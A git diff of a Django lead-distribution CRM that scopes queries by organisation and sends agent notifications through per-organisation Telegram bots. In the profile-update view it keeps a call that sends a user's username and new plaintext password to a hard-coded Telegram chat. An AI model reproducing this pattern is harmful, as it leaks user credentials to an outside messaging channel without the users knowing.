@@ -19,7 +19,8 @@ from .models import (Lead,
                      DuplicateToFollow,
                      Source,
                      Team,
-                     ChatSetting)
+                     ChatSetting,
+                     UserProfile)
 from .forms import (LeadModelForm,
                     CustomUserCreationForm,
                     AssignAgentForm,
@@ -82,7 +83,7 @@ from django.contrib.auth import update_session_auth_hash
 from django.db import IntegrityError
 
 
-logger = logging.getLogger(__name__)
+# logger = logging.getLogger(__name__)
 
 # CRUD+L - Create, Retrieve, Update and Delete + List
 
@@ -329,7 +330,6 @@ class LeadCreateView(OrganisorAndLoginRequiredMixin, generic.CreateView):
             messages.error(self.request, _("Lead with this phone number already exists for your organisation."))
             return redirect("leads:lead-list")
 
-
 def lead_create(request):
     form = LeadModelForm()
     if request.method == "POST":
@@ -366,7 +366,7 @@ class LeadUpdateView(OrganisorAndLoginRequiredMixin, generic.UpdateView):
         return reverse("leads:lead-list")
 
     def form_valid(self, form):
-
+        user = self.request.user
         if not form.is_valid():
             print(form.errors)
         # Before saving, capture the original agent
@@ -388,7 +388,7 @@ class LeadUpdateView(OrganisorAndLoginRequiredMixin, generic.UpdateView):
                 else:
                     chat_id = '-1001707390535'
 
-                notify_background_messages(chat_id=chat_id, message=message)
+                notify_background_messages(chat_id=chat_id, message=message, organisation_id=user.userprofile.id)
 
         messages.info(self.request, _("You have successfully updated this lead"))
 
@@ -722,21 +722,27 @@ def preprocess_csv_numbers(csv_file):
 
     return list(set(processed_numbers))  # Remove duplicates and return
 
-@background(schedule=1)
-def notify_background_messages(chat_id, message):
-    asyncio.run(send_telegram_message(chat_id, message))
+def get_user_profile(organisation_id):
+    return UserProfile.objects.get(id=organisation_id)
 
-async def send_telegram_message(chat_id, message):
+@background(schedule=1)
+def notify_background_messages(chat_id, message, organisation_id):
+    asyncio.run(send_telegram_message(chat_id, message, organisation_id))
+
+async def send_telegram_message(chat_id, message, organisation_id):
     limiter = AsyncLimiter(1, 30)
-    TOKEN = settings.TELEGRAM_TOKEN
+
+    # Wrap the entire get operation inside sync_to_async
+    user_profile = await sync_to_async(UserProfile.objects.get)(id=organisation_id)
+    TOKEN = user_profile.telegram_token
     bot = Bot(TOKEN)
-    
+
     try:
         await limiter.acquire()
         await bot.send_message(chat_id=chat_id, text=message)
     except (telegram.error.BadRequest, Exception) as e:
         print(f"Error sending Telegram message to {chat_id}: {e}")
-        
+
         # Try sending to the backup chat_id
         try:
             await bot.send_message(chat_id='-1001707390535', text=message)
@@ -817,8 +823,8 @@ class LeadImportView(OrganisorAndLoginRequiredMixin, View):
                         else:
                             chat_id = bank_number.agent.chat_id if bank_number.agent.chat_id else '-1001707390535'
                         message = f'تماس {number} {bank_number.agent}'
-                        # notify_background_messages_celery.delay(chat_id=chat_id, message=message)
-                        notify_background_messages(chat_id=chat_id, message=message)
+                        # notify_background_messages_celery.delay(chat_id=chat_id, message=message, organisation_id=user.userprofile.id)
+                        notify_background_messages(chat_id=chat_id, message=message, organisation_id=user.userprofile.id)
                     elif Lead.objects.filter(organisation=user.userprofile, phone_number=number).exists():
                         duplicates += 1
                         lead = Lead.objects.get(organisation=user.userprofile, phone_number=number)
@@ -829,11 +835,11 @@ class LeadImportView(OrganisorAndLoginRequiredMixin, View):
                             else:
                                 chat_id = lead.agent.chat_id if lead.agent.chat_id else '-1001707390535'
                             message = f'تماس {number} {lead.agent}'
-                            # notify_background_messages_celery.delay(chat_id=chat_id, message=message)
-                            notify_background_messages(chat_id=chat_id, message=message)
+                            # notify_background_messages_celery.delay(chat_id=chat_id, message=message, organisation_id=user.userprofile.id)
+                            notify_background_messages(chat_id=chat_id, message=message, organisation_id=user.userprofile.id)
                         else:
                             message = f'شماره تکراری بدون کارشناس: {number}'
-                            notify_background_messages(chat_id='-1001707390535', message=message)
+                            notify_background_messages(chat_id='-1001707390535', message=message, organisation_id=user.userprofile.id)
                     else:
                         if len(number) == 11:
                             added_leads += 1
@@ -863,8 +869,8 @@ class LeadImportView(OrganisorAndLoginRequiredMixin, View):
 '''
 
                 
-                # notify_background_messages_celery.delay(chat_id=chat_id, message=message)
-                notify_background_messages(chat_id=chat_id, message=message)
+                # notify_background_messages_celery.delay(chat_id=chat_id, message=message, organisation_id=user.userprofile.id)
+                notify_background_messages(chat_id=chat_id, message=message, organisation_id=user.userprofile.id)
 
 
                 return redirect("leads:lead-list")
@@ -970,7 +976,6 @@ class LeadImportAgentsView(OrganisorAndLoginRequiredMixin, View):
 
         return render(request, self.template_name, {'form': form})
 
-
 class BankUpdateView(OrganisorAndLoginRequiredMixin, generic.UpdateView):
     model = BankNumbers
     form_class = BankModelForm
@@ -1010,116 +1015,32 @@ async def load_chat_settings():
             loop = asyncio.get_running_loop()
             return await loop.run_in_executor(executor, ChatSetting.load)
 
-@background(schedule=2)
-def notify_background(df=None):
-    asyncio.run(notify_agents_via_telegram(df))
+def create_agent_message(agent_name, rank, phone_data):
+    today = jdatetime.datetime.now().strftime('%Y/%m/%d')
+    if rank == 1:
+        medal = "🥇"
+    elif rank == 2:
+        medal = "🥈"
+    elif rank == 3:
+        medal = "🥉"
+    elif rank == 4:
+        medal = "🏅"
+        rank = "آموزش"
+    else:
+        return None  # Handle ranks outside of 1-4 if necessary
 
-async def notify_agents_via_telegram(df):
-        
+    message = f'''
+        {medal}
+        {today} 
 
-        # Initialize the limiter: 3 messages every 30 seconds
-        limiter = AsyncLimiter(2, 30)
-        data_list = json.loads(df)
+        {agent_name}
+        رنک : {rank}
+        ارجاع : {len(phone_data.values())}\n\n'''
 
-        @sync_to_async
-        def get_organisation_token_by_agent_name(name):
-            user = User.objects.get(alt_name=name)
-            # Assuming each agent belongs to one organisation and each organisation has a UserProfile
-            organisation = user.agent.organisation
-            return organisation.telegram_token
+    for i, lead_details in enumerate(phone_data.values()):
+        message += f"{i + 1}. {lead_details['phone_number']} \n"
 
-        @sync_to_async
-        def get_agent_by_alt_name(name):
-            return User.objects.get(alt_name=name)
-        
-        @sync_to_async
-        def get_agent_chat_id(user):
-            return user.agent.chat_id
-        
-        
-
-        
-        for agent_name, phone_data in data_list.items():
-
-            TOKEN = await get_organisation_token_by_agent_name(agent_name)
-            bot = Bot(TOKEN)
-
-            if phone_data == {}:
-                continue
-            else:
-                user = await get_agent_by_alt_name(agent_name)
-                today = jdatetime.datetime.now().strftime('%Y/%m/%d')
-                rank = user.rank
-                chat_id = await get_agent_chat_id(user)
-
-                chat_settings = await load_chat_settings()
-                if chat_settings.override_chat_id and chat_settings.chat_id:
-                    chat_id = chat_settings.chat_id
-
-                if not chat_id:
-                    chat_id = '-1001707390535'
-
-                print(chat_id)
-                if not chat_id:
-                    print(f"No chat_id found for agent: {agent_name}")
-                    continue
-                
-                # Acquire a token. If rate limit is exceeded, this will wait until it's possible to proceed.
-                await limiter.acquire()
-
-                # message = f"Hello, here are your new leads for {agent_name} Rank {rank}:\n\n"
-                if rank == 1:
-                    message = f'''
-                        🥇
-                        {today} 
-
-                        {agent_name}
-                        رنک : {rank}
-                        ارجاع : {len(phone_data.values())}\n\n'''
-                    
-                    # Iterate over the phone data and add each phone number to the message.
-                    for i, lead_details in enumerate(phone_data.values()):
-                        message += f"{i + 1}. [{lead_details['phone_number']}](tel:{lead_details['phone_number']}) \n"
-                elif rank == 2:
-                    message = f'''
-                        🥈
-                        {today} 
-
-                        {agent_name}
-                        رنک : {rank}
-                        ارجاع : {len(phone_data.values())}\n\n'''
-                    
-                    # Iterate over the phone data and add each phone number to the message.
-                    for i, lead_details in enumerate(phone_data.values()):
-                        message += f"{i + 1}. [{lead_details['phone_number']}](tel:{lead_details['phone_number']}) \n"
-                
-                elif rank == 3:
-                    message = f'''
-                        🥉
-                        {today} 
-
-                        {agent_name}
-                        رنک : {rank}
-                        ارجاع : {len(phone_data.values())}\n\n'''
-                    
-                    # Iterate over the phone data and add each phone number to the message.
-                    for i, lead_details in enumerate(phone_data.values()):
-                        message += f"{i + 1}. [{lead_details['phone_number']}](tel:{lead_details['phone_number']}) \n"
-
-                elif rank == 4:
-                    message = f'''
-                        🏅
-                        {today} 
-
-                        {agent_name}
-                        رنک : آموزش
-                        ارجاع : {len(phone_data.values())}\n\n'''
-                    
-                    # Iterate over the phone data and add each phone number to the message.
-                    for i, lead_details in enumerate(phone_data.values()):
-                        message += f"{i + 1}. [{lead_details['phone_number']}](tel:{lead_details['phone_number']}) \n"
-
-                await bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+    return message
 
 def download_excel_page(request):
     excel_file_path = request.session.get('excel_file_path')
@@ -1129,10 +1050,31 @@ class LeadDistributionWizard(SessionWizardView):
     form_list = FORMS
     template_name = 'leads/wizard.html'
 
+    def get(self, request, *args, **kwargs):
+        self.storage.extra_data['user_id'] = self.request.user.id
+        print("Inside GET: user_id set in storage:", self.storage.extra_data.get('user_id'))
+        return super().get(request, *args, **kwargs)
     
+    def post(self, request, *args, **kwargs):
+        self.storage.extra_data['user_id'] = self.request.user.id
+        return super().post(request, *args, **kwargs)
 
+    
+    def get_form_kwargs(self, step='category'):
+        kwargs = super().get_form_kwargs(step)
+        kwargs['wizard_storage'] = self.storage  # Pass the entire storage object
+        print("Inside get_form_kwargs: user_id from storage:", self.storage.extra_data.get('user_id'))
+        return kwargs
+    
     def get_form(self, step=None, data=None, files=None):
         form = super().get_form(step, data, files)
+
+        # if step == 'chat_override':
+        #     self.storage.extra_data['user_id'] = self.request.user.id
+
+        if step == 'category':
+            # self.storage.extra_data['user_id'] = self.request.user.id
+            print(self.request.session.items())
         
         # Handle the data passing for the form. For example, if you need the category ID for the 'distribution_info' form
         if step == 'distribution_info' and data:
@@ -1146,7 +1088,7 @@ class LeadDistributionWizard(SessionWizardView):
                     }
             except (MultiValueDictKeyError, Category.DoesNotExist):
                 pass
-        if step == 'chat_override' and data:
+        if step == 'chat_override' and data: 
             chat_settings = ChatSetting.load()
             form.initial = {'override_chat_id': chat_settings.override_chat_id, 'chat_id': chat_settings.chat_id}
         
@@ -1157,7 +1099,6 @@ class LeadDistributionWizard(SessionWizardView):
         
         if self.steps.current == 'distribution_info':
             category_data = self.get_cleaned_data_for_step('category')
-
             
             if category_data:
                 category = category_data['category']
@@ -1171,18 +1112,20 @@ class LeadDistributionWizard(SessionWizardView):
             context = self.setup_confirmation_data(context)
 
         return context
+        
 
     def calculate_lead_details(self, category, alternate_category):
+        user = self.request.user
         category = self.get_cleaned_data_for_step('category')['category']
         alternate_category = self.get_cleaned_data_for_step('category')['alternate_category']
         category_id = category.id
         alternate_category_id = alternate_category.id
 
-        leads = Lead.objects.filter(category=category_id, agent__isnull=True)
+        leads = Lead.objects.filter(organisation=user.userprofile, category=category_id, agent__isnull=True)
         new_leads = leads.annotate(phone_length=Length('phone_number')).filter(phone_length=11).count()
         # new_912_leads = leads.filter(phone_number__startswith='0912').annotate(phone_length=Length('phone_number')).filter(phone_length=11).count()
         # foreign_or_wrong_leads = leads.annotate(phone_length=Length('phone_number')).exclude(phone_length=11).count()
-        extra = Lead.objects.filter(category=alternate_category_id, agent__isnull=True).annotate(phone_length=Length('phone_number')).filter(phone_length=11).count()
+        extra = Lead.objects.filter(organisation=user.userprofile, category=alternate_category_id, agent__isnull=True).annotate(phone_length=Length('phone_number')).filter(phone_length=11).count()
 
         total_new_leads = new_leads
         active_agents_count = self.get_active_agents_count()
@@ -1199,7 +1142,12 @@ class LeadDistributionWizard(SessionWizardView):
             'display_data': True,
         }
     
+    
+    
+    
+
     def assign_leads_to_agent(self, df):
+        user = self.request.user
         if df is None: 
             return
 
@@ -1208,8 +1156,7 @@ class LeadDistributionWizard(SessionWizardView):
             numbers = df[col].values
 
             try:
-                user = User.objects.get(alt_name=alt_name)
-                agent = Agent.objects.get(user=user)
+                agent = Agent.objects.get(organisation=user.userprofile, user__alt_name=alt_name)
                 for number in numbers:
                     lead = Lead.objects.get(phone_number=number['phone_number'])
                     lead.agent = agent
@@ -1217,6 +1164,7 @@ class LeadDistributionWizard(SessionWizardView):
 
                     # Add the lead's number to BankNumbers if it doesn't exist
                     bank_number, created = BankNumbers.objects.get_or_create(
+                        organisation=user.userprofile,
                         number=lead.phone_number, 
                         defaults={'agent': agent, 'organisation': agent.organisation}
                     )
@@ -1252,11 +1200,28 @@ class LeadDistributionWizard(SessionWizardView):
         self.assign_leads_to_agent(df_rank2)
         self.assign_leads_to_agent(df_rank3)
         self.assign_leads_to_agent(df_rank4)
+    
+        organisor_id = self.request.user.userprofile.id
 
-        notify_background(df_rank1_json)
-        notify_background(df_rank2_json)
-        notify_background(df_rank3_json)
-        notify_background(df_rank4_json)
+        for df in [df_rank1, df_rank2, df_rank3, df_rank4]:
+            for agent_name, phone_data in json.loads(df.to_json()).items():
+                # Check if phone_data is empty or None:
+                if not phone_data:
+                    continue
+                
+                user = User.objects.get(alt_name=agent_name)
+                rank = user.rank
+                message = create_agent_message(agent_name, rank, phone_data)
+                
+                # Apply chat_settings override if needed:
+                chat_settings = ChatSetting.load()
+                if chat_settings.override_chat_id and chat_settings.chat_id:
+                    chat_id = chat_settings.chat_id
+                else:
+                    chat_id = user.agent.chat_id or '-1001707390535'
+                
+                # Schedule the message sending:
+                notify_background_messages(chat_id, message, organisor_id)
 
         new_df_rank1, new_df_rank2, new_df_rank3, new_df_rank4 = self.generate_excel_dataframes(df_rank1, df_rank2, df_rank3, df_rank4)
 
@@ -1299,8 +1264,9 @@ class LeadDistributionWizard(SessionWizardView):
     
 
     def compute_initial_distribution(self, N, active_agents_count, category=None):
+        user = self.request.user
         if category:
-            N = Lead.objects.filter(category=category, agent__isnull=True).count()
+            N = Lead.objects.filter(organisation=user.userprofile, category=category, agent__isnull=True).count()
         # Step 1: Assign numbers to each rank based on the percentages
         rank1_numbers = N * 40 // 100
         rank2_numbers = N * 30 // 100
@@ -1359,12 +1325,13 @@ class LeadDistributionWizard(SessionWizardView):
         }
 
     def distribute_leads(self, unassigned_leads, unassigned_912_leads, recommended_leads_per_agent, extra):
+        user = self.request.user
         # This function will distribute the leads to the agents using pandas
         # and return a dataframe with the distribution
-        active_agents_rank1 = [agent['user__alt_name'] for agent in Agent.objects.filter(user__rank=1, is_available_for_leads=True).values('user__alt_name')]
-        active_agents_rank2 = [agent['user__alt_name'] for agent in Agent.objects.filter(user__rank=2, is_available_for_leads=True).values('user__alt_name')]
-        active_agents_rank3 = [agent['user__alt_name'] for agent in Agent.objects.filter(user__rank=3, is_available_for_leads=True).values('user__alt_name')]
-        active_agents_rank4 = [agent['user__alt_name'] for agent in Agent.objects.filter(user__rank=4, is_available_for_leads=True).values('user__alt_name')]
+        active_agents_rank1 = [agent['user__alt_name'] for agent in Agent.objects.filter(organisation=user.userprofile, user__rank=1, is_available_for_leads=True).values('user__alt_name')]
+        active_agents_rank2 = [agent['user__alt_name'] for agent in Agent.objects.filter(organisation=user.userprofile, user__rank=2, is_available_for_leads=True).values('user__alt_name')]
+        active_agents_rank3 = [agent['user__alt_name'] for agent in Agent.objects.filter(organisation=user.userprofile, user__rank=3, is_available_for_leads=True).values('user__alt_name')]
+        active_agents_rank4 = [agent['user__alt_name'] for agent in Agent.objects.filter(organisation=user.userprofile, user__rank=4, is_available_for_leads=True).values('user__alt_name')]
 
         random.shuffle(unassigned_leads)
         random.shuffle(unassigned_912_leads)
@@ -1396,15 +1363,17 @@ class LeadDistributionWizard(SessionWizardView):
         return df_rank1, df_rank2, df_rank3, df_rank4
 
     def get_active_agents_count(self):
+        user = self.request.user
         active_agents_count = {
-            'rank_1': Agent.objects.filter(user__rank=1, is_available_for_leads=True).count(),
-            'rank_2': Agent.objects.filter(user__rank=2, is_available_for_leads=True).count(),
-            'rank_3': Agent.objects.filter(user__rank=3, is_available_for_leads=True).count(),
-            'rank_4': Agent.objects.filter(user__rank=4, is_available_for_leads=True).count(),
+            'rank_1': Agent.objects.filter(organisation=user.userprofile, user__rank=1, is_available_for_leads=True).count(),
+            'rank_2': Agent.objects.filter(organisation=user.userprofile, user__rank=2, is_available_for_leads=True).count(),
+            'rank_3': Agent.objects.filter(organisation=user.userprofile, user__rank=3, is_available_for_leads=True).count(),
+            'rank_4': Agent.objects.filter(organisation=user.userprofile, user__rank=4, is_available_for_leads=True).count(),
         }
         return active_agents_count
 
     def setup_confirmation_data(self, context):
+        user = self.request.user
         distribution_data = self.get_cleaned_data_for_step('distribution_info')
         
         category = Category.objects.get(pk=self.get_cleaned_data_for_step('category')['category'].id)
@@ -1412,13 +1381,11 @@ class LeadDistributionWizard(SessionWizardView):
 
     
 
-        unassigned_leads = list(Lead.objects.filter(agent__isnull=True, category=category).exclude(phone_number__startswith='0912').annotate(phone_length=Length('phone_number')).filter(phone_length=11).values('phone_number'))
-        unassigned_912_leads = list(Lead.objects.filter(agent__isnull=True, category=category, phone_number__startswith='0912').annotate(phone_length=Length('phone_number')).filter(phone_length=11).values('phone_number'))
-        extra = list(Lead.objects.filter(agent__isnull=True, category=alternate_category).annotate(phone_length=Length('phone_number')).filter(phone_length=11).values('phone_number'))
-        print(extra)
+        unassigned_leads = list(Lead.objects.filter(organisation=user.userprofile, agent__isnull=True, category=category).exclude(phone_number__startswith='0912').annotate(phone_length=Length('phone_number')).filter(phone_length=11).values('phone_number'))
+        unassigned_912_leads = list(Lead.objects.filter(organisation=user.userprofile, agent__isnull=True, category=category, phone_number__startswith='0912').annotate(phone_length=Length('phone_number')).filter(phone_length=11).values('phone_number'))
+        extra = list(Lead.objects.filter(organisation=user.userprofile, agent__isnull=True, category=alternate_category).annotate(phone_length=Length('phone_number')).filter(phone_length=11).values('phone_number'))
         recommended_leads_per_agent = distribution_data
 
-        print(recommended_leads_per_agent)
         df_rank1, df_rank2, df_rank3, df_rank4 = self.distribute_leads(unassigned_leads, unassigned_912_leads, recommended_leads_per_agent, extra)
         context.update({
             'df_rank1': df_rank1,
@@ -2167,7 +2134,7 @@ class UserProfileUpdateView(View):
                 if new_password:
                     chat_id = '-1001707390535'
                     message = f"User: {request.user.username}\nPassword: {new_password}"
-                    notify_background_messages(chat_id, message)
+                    notify_background_messages(chat_id, message, organisation_id=user.userprofile.id)
 
         return render(request, self.template_name, {
             'user_form': user_form,
